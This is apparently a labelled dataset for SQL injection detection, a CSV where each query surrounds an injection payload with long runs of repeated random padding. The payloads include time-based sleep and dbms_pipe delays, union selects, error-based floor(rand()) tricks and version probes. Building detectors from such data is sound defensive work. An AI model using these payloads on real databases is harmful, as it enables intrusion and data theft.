Query,Label
"MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 ""1 or row(1045 7562)>(select count(*) concat(0x7171706a71 (select (elt(1045=1045 1))) 0x717a767a71 ""floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)-- fwzl"""" MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz6rp7 MMYuojYRrlYq0FEz",1
"VpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEE ""1%')) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441) 0) 5000000000) ""null)--"""" VpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiCEEVpA2rjOlb8pFYfGNiC",1
MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H 1) as vbli where 5139=5139 and 2782=2625-- MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H MGgSGe2K8WUbfJqXjH5H ,1
tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2 1')) and sleep(5) and (('jiio' like 'jiio tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2tLOptiUPJC7J2XmhNNB2,1
"XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm ""1')) as kpdl where 4443=4443 union all select null null null null null ""null--"""" XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETaltqLm XVOst2QVPuOXETalt",1
"9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv 9RHUXAI779I0L2ylYUMv ""1"""";select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101) ""5) from dual and """"""""psbz""""""""=""""""""psbz""""",1
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -1217' ) ) ) order by 1# 12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv12g3CaewK83qbM8SVWvv,1
FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH 1'+(select xzse where 4530=4530;(select * from (select(sleep(5)))srmq))+' FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH FOBtgjfj07a6jEoJZjjH ,1
"HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu ""select * from users where id = 1 or \<1 union select 1 ""@@VERSION -- 1"""" HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu HqMLLnkmuySe35r8hhDu ",1
w66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduR 1 where 5700=5700;select pg_sleep(5)-- w66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduRw66DrLRpl1vIEIzMQduR,1
"RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG ""1) and elt(4249=4249 ""7259)"""" RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG RCc7OwelNIHGUEuxLtKG ",1
"0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 ""1%""""));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101) ""5) from dual and ((""""""""%""""""""="""""""""""" 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 0MxjTm3BCp2REIfHnN01 ",1
"V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP ""1"""") and elt(4249=4249 ""7259) and (""""""""upkx""""""""=""""""""upkx"""" V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP V2lVjQajDgt2rfJJpxUP ",1
